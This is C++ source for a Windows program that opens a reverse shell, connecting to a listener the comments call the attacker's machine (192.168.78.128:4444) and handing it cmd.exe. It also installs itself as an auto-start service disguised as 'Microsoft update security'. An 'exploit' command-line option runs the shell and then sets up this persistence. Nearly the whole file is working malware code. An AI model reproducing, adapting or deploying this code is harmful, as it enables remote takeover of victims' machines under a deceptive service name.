// sample1.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <iostream>
#include <Windows.h> // Windows service

#include <stdio.h>
#pragma warning(disable:4996)
#pragma comment(lib, "ws2_32")

using namespace std;

//---------------------Global variable for reverse shell----------------------//
WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

//---------------------Global variable for service----------------------//
#define                 SERVICE_NAME TEXT("Microsoft update security") // Service name
SERVICE_STATUS          ServiceStatus = { 0 }; // Service status structure
SERVICE_STATUS_HANDLE   hServiceStatusHandle = NULL; // To register service
HANDLE                  hServiceEvent = NULL; // Event handle for service


//-------------------Windows service function----------------------//
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpArgv); // Service's main function
void WINAPI ServiceCtrlHandler(DWORD dwControl); // Service control handle
void ServiceReportStatus(
    DWORD dwCurrentState,
    DWORD dwWin32ExitCode,
    DWORD dwWaitHint
); // Report status of service
void ServiceInit(DWORD dwArgc, LPTSTR* lpArgv); // Init service
void ServiceInstall(void); // Install service
void ServiceDelete(void); // Delete service
void ServiceStart(void); // Start service
void ServiceStop(void); // Stop service

void CreateReverseShell(); // Create reverse shell


//-----------Main function-----------//
int main(int argc, CHAR *argv[])
{
    ////std::cout << "Hello World!\n";
    ////cout << "Main serrvice\n";

    BOOL bStServiceCtrlDispatcher = FALSE;

    if (lstrcmpiA(argv[1],"install") == 0)
    {
        // Call service install function
        ServiceInstall();
        cout << "Installed service!\n";
    }
    else if (lstrcmpiA(argv[1], "start") == 0)
    {
        // Call service start function
        ServiceStart();
        cout << "Service started!\n";
    }
    else if (lstrcmpiA(argv[1], "exploit") == 0)
    {
        CreateReverseShell();
        ServiceInstall();
        ServiceStart();
        cout << "Service started!\n";
    }
    else if (lstrcmpiA(argv[1], "stop") == 0)
    {
        // Call service stop function
        ServiceStop();
        cout << "Service stopped!\n";
    }
    else if (lstrcmpiA(argv[1], "delete") == 0)
    {
        // Call service delete function
        ServiceDelete();
        cout << "service deleted!\n";
    }
    else
    {
        //std::cout << "Hello World!\n";
        //cout << "Main serrvice\n";

        BOOL bStServiceCtrlDispatcher = FALSE;

        //// listener ip, port on attacker's machine
        //const char* ip = "192.168.78.128";
        //short port = 4444;

        //// init socket lib
        //WSAStartup(MAKEWORD(2, 2), &wsaData);

        //// create socket
        //wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

        //hax.sin_family = AF_INET;
        //hax.sin_port = htons(port);
        //hax.sin_addr.s_addr = inet_addr(ip);
        ////InetPton(AF_INET, _T("192.168.1.1"), &hax.sin_addr.s_addr);
        //// connect to remote host
        //WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

        //memset(&sui, 0, sizeof(sui));
        //sui.cb = sizeof(sui);
        //sui.dwFlags = STARTF_USESTDHANDLES;
        //sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

        //char text[] = "cmd.exe";
        //wchar_t wtext[20];
        //mbstowcs(wtext, text, strlen(text) + 1);//Plus null
        //LPWSTR cmd = wtext;
        //// start cmd.exe with redirected streams
        //CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
        ////exit(0);
        
        CreateReverseShell();
        // ------------------------------For service -------------------------------//
        // STEP 1 -> Fill the Service Table Entry (2D array)
        string srvName = "Microsoft update security";
        TCHAR serviceName[100] = TEXT("Microsoft update security");
        SERVICE_TABLE_ENTRY DispatchTable[] =
        {
            {serviceName,(LPSERVICE_MAIN_FUNCTION)ServiceMain},
            {NULL, NULL}
        };

        // STEP 2 -> Start Service Control Dispatcher
        //bStServiceCtrlDispatcher = StartServiceCtrlDispatcher(DispatchTable);
        if (!StartServiceCtrlDispatcher(DispatchTable))
        {
            cout << "Start ServiceControlDispatcher Failed " << GetLastError() << endl;
        }
        else
        {
            cout << "Start ServiceControlDispatcher Success " << endl;
        }
    }
    
    cout << "Function main end\n";
    system("PAUSE");
    return 0;
}

//-------------------Service main function-------------------//
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpArgv)
{
    cout << "Service main start\n";
    
    BOOL bServiceStatus = FALSE;
    // STEP 1 -> Register Service Control Handle Function to SCM
    hServiceStatusHandle = RegisterServiceCtrlHandler(
                            SERVICE_NAME,
                            ServiceCtrlHandler
                            );
    if (hServiceStatusHandle == NULL)
    {
        cout << "Register Service Handle Failed" << GetLastError() << endl;
    }
    else
    {
        cout << "Register Service Handle SUccess" << endl;
    }

    // STEP 2 -> SERVICE_STATUS Init setup here
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwServiceSpecificExitCode = 0;

    // STEP 3 -> Call Service Report Status
    ServiceReportStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

    // STEP 4 -> Check service status
    bServiceStatus = SetServiceStatus(hServiceStatusHandle, &ServiceStatus);
    if (bServiceStatus == FALSE)
    {
        cout << "Service Status Init Failed" << GetLastError() << endl;
    }
    else
    {
        cout << "Service Status Init Success" << endl;
    }

    // STEP 5 -> Call service Init function
    ServiceInit(dwArgc, lpArgv);
    cout << "Main function service end\n";
}

//------------------------Service Control Handle--------------------//
void WINAPI ServiceCtrlHandler(DWORD dwControl)
{
    cout << "Service control handl\n";

    switch (dwControl)
    {
        case SERVICE_CONTROL_STOP:
        {
            // Call ServiceReportStatus function
            ServiceReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
            cout << "Service stopped\n";
            break;
        }
        default:
            break;
    }
}

//---------------------Service Report Status function----------------------//
void ServiceReportStatus(
    DWORD dwCurrentState,
    DWORD dwWin32ExitCode,
    DWORD dwWaitHint
)
{
    cout << "ServiceReportStatus Start\n";
    static DWORD dwCheckPoint = 1;
    BOOL bSetServiceStatus = FALSE;

    // STEP 1 -> Filling the SERVICE_STATUS Structure
    ServiceStatus.dwCurrentState = dwCurrentState;
    ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
    ServiceStatus.dwWaitHint = dwWaitHint;

    // STEP 2 -> Check the Current State of service
    if (dwCurrentState == SERVICE_START_PENDING) // Service is about to start
    {
        ServiceStatus.dwControlsAccepted = 0;
    }
    else
    {
        ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    }

    // STEP 3 -> Progess for service operation
    if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED))
    {
        ServiceStatus.dwCheckPoint = 0;
    }
    else
    {
        ServiceStatus.dwCheckPoint = dwCheckPoint++;
    }

    // STEP 4 -> Send Current State to SCM
    bSetServiceStatus = SetServiceStatus(hServiceStatusHandle, &ServiceStatus);
    if (bSetServiceStatus == FALSE)
    {
        cout << " Set Service Status Failed" << GetLastError() << endl;
    }
    else
    {
        cout << " Set Service Status Success\n";
    }
    cout << "Service Report Status End\n";
}

//---------------------Service Init function----------------------//
void ServiceInit(DWORD dwArgc, LPTSTR* lpArgv)
{
    cout << "Service init start\n";

    // STEP 1 -> Create Event
    hServiceEvent = CreateEvent(
                    NULL,       // Security Attributes
                    TRUE,       // Manual reset event
                    FALSE,      // Non Signaled
                    NULL        // Name of event
    );

    if (hServiceEvent == NULL)
    {
        ServiceReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
    }
    else
    {
        ServiceReportStatus(SERVICE_RUNNING, NO_ERROR, 0);
    }

    // STEP 2 -> Check whether to stop service
    while (1)
    {
        // WaitForSingleObject which wait event to be signaled
        WaitForSingleObject(hServiceEvent, INFINITE);
        // Send status to SCM
        ServiceReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
    }
    
    cout << "Service Init End\n";
}

//---------------------------ServiceInstall function-------------------------//
void ServiceInstall(void)
{
    cout << "Service install start\n";

    SC_HANDLE       hScOpenSCManager = NULL;
    SC_HANDLE       hScCreateService = NULL;
    DWORD           dwGetModuleFileName = 0;
    TCHAR           szPath[MAX_PATH];

    // STEP 1 -> GetModuleFileNameget the executable file from SCM
    dwGetModuleFileName = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (dwGetModuleFileName == 0)
    {
        cout << "Service installation failed " << GetLastError() << endl;
    }
    else
    {
        cout << "Service installation success\n";
    }

    // STEP 2 -> Open Service Control Manager (SCM)
    hScOpenSCManager = OpenSCManager(
                        NULL,                       // Local machine
                        NULL,                       // By default database
                        SC_MANAGER_ALL_ACCESS       // Access right
    );
    if (hScOpenSCManager == NULL)
    {
        cout << "Open SCManager failed " << GetLastError() << endl;
    }
    else
    {
        cout << "Open SCManager success\n";
    }

    // STEP 3 -> Create Service
    hScCreateService = CreateService(
                        hScOpenSCManager,
                        SERVICE_NAME,
                        SERVICE_NAME,
                        SERVICE_ALL_ACCESS,
                        SERVICE_WIN32_OWN_PROCESS,
                        SERVICE_AUTO_START,
                        SERVICE_ERROR_NORMAL,
                        szPath,
                        NULL,
                        NULL,
                        NULL,
                        NULL,
                        NULL
    );
    if (hScCreateService == NULL)
    {
        cout << "Create service failed " << GetLastError() << endl;
        CloseServiceHandle(hScOpenSCManager);
    }
    else
    {
        cout << "Create service success\n";
    }

    // STEP 4 -> Close the HANDLE for Open SCManager and Create Service
    CloseServiceHandle(hScOpenSCManager);
    CloseServiceHandle(hScCreateService);

    cout << "Service intallation end\n";
}

//----------------------Service delete function-----------------------//
void ServiceDelete(void)
{
    cout << "Service delete start\n";

    SC_HANDLE hScOpenSCManager = NULL;
    SC_HANDLE hScOpenService = NULL;
    BOOL bDeleteService = FALSE;

    // STEP 1 -> Open Service Control Manager (SCM)
    hScOpenSCManager = OpenSCManager(
        NULL,                       // Local machine
        NULL,                       // By default database
        SC_MANAGER_ALL_ACCESS       // Access right
    );
    if (hScOpenSCManager == NULL)
    {
        cout << "Open SCManager failed " << GetLastError() << endl;
    }
    else
    {
        cout << "Open SCManager success\n ";
    }

    // STEP 2 -> Open Service
    hScOpenService = OpenService(
                        hScOpenSCManager,
                        SERVICE_NAME,
                        SERVICE_ALL_ACCESS
    );

    if (hScOpenService == NULL)
    {
        cout << "Open Service failed " << GetLastError() << endl;
    }
    else
    {
        cout << "Open Service success\n";
    }

    // STEP 3 -> Delete Service
    bDeleteService = DeleteService(hScOpenService);
    if (bDeleteService == FALSE)
    {
        cout << "Delete Service failed " << GetLastError() << endl;
    }
    else
    {
        cout << "Delete Service success\n";
    }

    // STEP 4 -> Close the HANDLE for Open SCManager and Open Service
    CloseServiceHandle(hScOpenService);
    CloseServiceHandle(hScOpenSCManager);

    cout << "Service delete end\n";
}

//-------------------Service start function--------------------//
void ServiceStart(void)
{
    cout << "Inside service start function\n";

    BOOL bStartService = FALSE;
    SERVICE_STATUS_PROCESS SvcStatusProcess;
    SC_HANDLE hOpenSCManager = NULL;
    SC_HANDLE hOpenService = NULL;
    BOOL bQueryServiceStatus = FALSE;
    DWORD dwBytesNeeded;

    // STEP 1 -> Open Service Control Manager (SCM)
    hOpenSCManager = OpenSCManager(
        NULL,                       // Local machine
        NULL,                       // By default database
        SC_MANAGER_ALL_ACCESS       // Access right
    );
    if (hOpenSCManager == NULL)
    {
        cout << "Open SCManager failed " << GetLastError() << endl;
    }
    else
    {
        cout << "Open SCManager success\n";
    }

    // STEP 2 -> Open Service
    hOpenService = OpenService(
        hOpenSCManager,
        SERVICE_NAME,
        SC_MANAGER_ALL_ACCESS
    );

    if (hOpenService == NULL)
    {
        cout << "Open Service failed " << GetLastError() << endl;
        CloseServiceHandle(hOpenSCManager);
    }
    else
    {
        cout << "Open Service success\n";
    }

    // STEP 3 -> Query about current service state
    bQueryServiceStatus = QueryServiceStatusEx(
                            hOpenService,
                            SC_STATUS_PROCESS_INFO,
                            (LPBYTE)&SvcStatusProcess,
                            sizeof(SERVICE_STATUS_PROCESS),
                            &dwBytesNeeded
    );
    if (bQueryServiceStatus == FALSE)
    {
        cout << "Query Service failed " << GetLastError() << endl;
        //CloseServiceHandle(hOpenSCManager);
    }
    else
    {
        cout << "Query Service success\n";
    }

    // STEP 4 -> Check service is running or stopped
    if ((SvcStatusProcess.dwCurrentState != SERVICE_STOPPED) &&
        (SvcStatusProcess.dwCurrentState != SERVICE_STOP_PENDING))
    {
        cout << "Service is already running\n";
    }
    else
    {
        cout << "Service is already stopped\n";
    }

    // STEP 5 -> If service is stopped, then query the service
    while (SvcStatusProcess.dwCurrentState == SERVICE_STOP_PENDING)
    {
        bQueryServiceStatus = QueryServiceStatusEx(
            hOpenService,
            SC_STATUS_PROCESS_INFO,
            (LPBYTE)&SvcStatusProcess,
            sizeof(SERVICE_STATUS_PROCESS),
            &dwBytesNeeded
        );
        if (bQueryServiceStatus == FALSE)
        {
            cout << "Query Service failed " << GetLastError() << endl;
            CloseServiceHandle(hOpenService);
            CloseServiceHandle(hOpenSCManager);
        }
        else
        {
            cout << "Query Service success\n";
        }
    }

    // STEP 6 -> Start the service
    bStartService = StartService(
                    hOpenService,
                    NULL,
                    NULL
    );
    if (bStartService == FALSE)
    {
        cout << "Start Service failed " << GetLastError() << endl;
        CloseServiceHandle(hOpenService);
        CloseServiceHandle(hOpenSCManager);
    }
    else
    {
        cout << "Start Service success\n";
    }

    // STEP 7 -> query the service again
    bQueryServiceStatus = QueryServiceStatusEx(
        hOpenService,
        SC_STATUS_PROCESS_INFO,
        (LPBYTE)&SvcStatusProcess,
        sizeof(SERVICE_STATUS_PROCESS),
        &dwBytesNeeded
    );
    if (bQueryServiceStatus == FALSE)
    {
        cout << "Query Service failed " << GetLastError() << endl;
        CloseServiceHandle(hOpenService);
        CloseServiceHandle(hOpenSCManager);
    }
    else
    {
        cout << "Query Service success\n";
    }

    // STEP 8 -> Check the service running or not
    if (SvcStatusProcess.dwCurrentState == SERVICE_RUNNING)
    {
        cout << "Service started running...\n";
    }
    else
    {
        cout << "Running Service failed " << GetLastError() << endl;
        CloseServiceHandle(hOpenService);
        CloseServiceHandle(hOpenSCManager);
    }

    // STEP 9 -> Close HANDLE for Open SCM and Open Service
    CloseServiceHandle(hOpenService);
    CloseServiceHandle(hOpenSCManager);
    cout << "Service start end\n";
}

void ServiceStop(void)
{
    cout << "Inside service stop\n";

    SERVICE_STATUS_PROCESS SvcStatusProcess;
    SC_HANDLE hScOpenSCManager = NULL;
    SC_HANDLE hScOpenService = NULL;
    BOOL bQueryServiceStatus = TRUE;
    BOOL bControlService = TRUE;
    DWORD dwBytesNeeded;

    // STEP 1 -> Open Service Control Manager (SCM)
    hScOpenSCManager = OpenSCManager(
                        NULL,                       // Local machine
                        NULL,                       // By default database
                        SC_MANAGER_ALL_ACCESS       // Access right
    );
    if (hScOpenSCManager == NULL)
    {
        cout << "Open SCManager failed" << GetLastError() << endl;
    }
    else
    {
        cout << "Open SCManager success\n";
    }

    // STEP 2 -> Open Service
    hScOpenService = OpenService(
                        hScOpenSCManager,
                        SERVICE_NAME,
                        SC_MANAGER_ALL_ACCESS
    );

    if (hScOpenService == NULL)
    {
        cout << "Open Service failed" << GetLastError() << endl;
        CloseServiceHandle(hScOpenSCManager);
    }
    else
    {
        cout << "Open Service success\n";
    }

    // STEP 3 -> Query status service state
    bQueryServiceStatus = QueryServiceStatusEx(
        hScOpenService,
        SC_STATUS_PROCESS_INFO,
        (LPBYTE)&SvcStatusProcess,
        sizeof(SERVICE_STATUS_PROCESS),
        &dwBytesNeeded
    );
    if (bQueryServiceStatus == FALSE)
    {
        cout << "Query Service failed " << GetLastError() << endl;
        CloseServiceHandle(hScOpenService);
        CloseServiceHandle(hScOpenSCManager);
    }
    else
    {
        cout << "Query Service success\n ";
    }

    // STEP 4 -> Send a stop to a service
    bControlService = ControlService(
                        hScOpenService,
                        SERVICE_CONTROL_STOP,
                        (LPSERVICE_STATUS)&SvcStatusProcess
    );

    if (bControlService == TRUE)
    {
        cout << "Control Service success\n";
    }
    else
    {
        cout << "Control Service failed\n";
        CloseServiceHandle(hScOpenService);
        CloseServiceHandle(hScOpenSCManager);
    }

    // STEP 5 -> wait for service to stop
    while (SvcStatusProcess.dwCurrentState != SERVICE_STOP)
    {
        bQueryServiceStatus = QueryServiceStatusEx(
            hScOpenService,
            SC_STATUS_PROCESS_INFO,
            (LPBYTE)&SvcStatusProcess,
            sizeof(SERVICE_STATUS_PROCESS),
            &dwBytesNeeded
        );
        if (bQueryServiceStatus == TRUE) 
        {
            cout << "Control Service success\n";
            //CloseServiceHandle(hScOpenService);
            //CloseServiceHandle(hScOpenSCManager);
        }
        else
        {
            cout << "Control Service failed" << GetLastError() << endl;
        }
        if (SvcStatusProcess.dwCurrentState == SERVICE_STOPPED)
        {
            cout << "Stop Service success\n";
            break;
        }
        else
        {
            cout << "Stop Service failed" << GetLastError() << endl;
            CloseServiceHandle(hScOpenService);
            CloseServiceHandle(hScOpenSCManager);
        }
    }

    // STEP 8 -> Close Service Handle for Open SCM and Service
    cout << "Stop service function end\n" << GetLastError() << endl;
    CloseServiceHandle(hScOpenService);
    CloseServiceHandle(hScOpenSCManager);
}

//---------------------- Create Reverse Shell function -----------------------//
void CreateReverseShell()
{
    // listener ip, port on attacker's machine
    const char* ip = "192.168.78.128";
    short port = 4444;

    // init socket lib
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // create socket
    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip);
    //InetPton(AF_INET, _T("192.168.1.1"), &hax.sin_addr.s_addr);
    // connect to remote host
    WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

    char text[] = "cmd.exe";
    wchar_t wtext[20];
    mbstowcs(wtext, text, strlen(text) + 1);//Plus null
    LPWSTR cmd = wtext;
    // start cmd.exe with redirected streams
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
    //exit(0);
}
// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
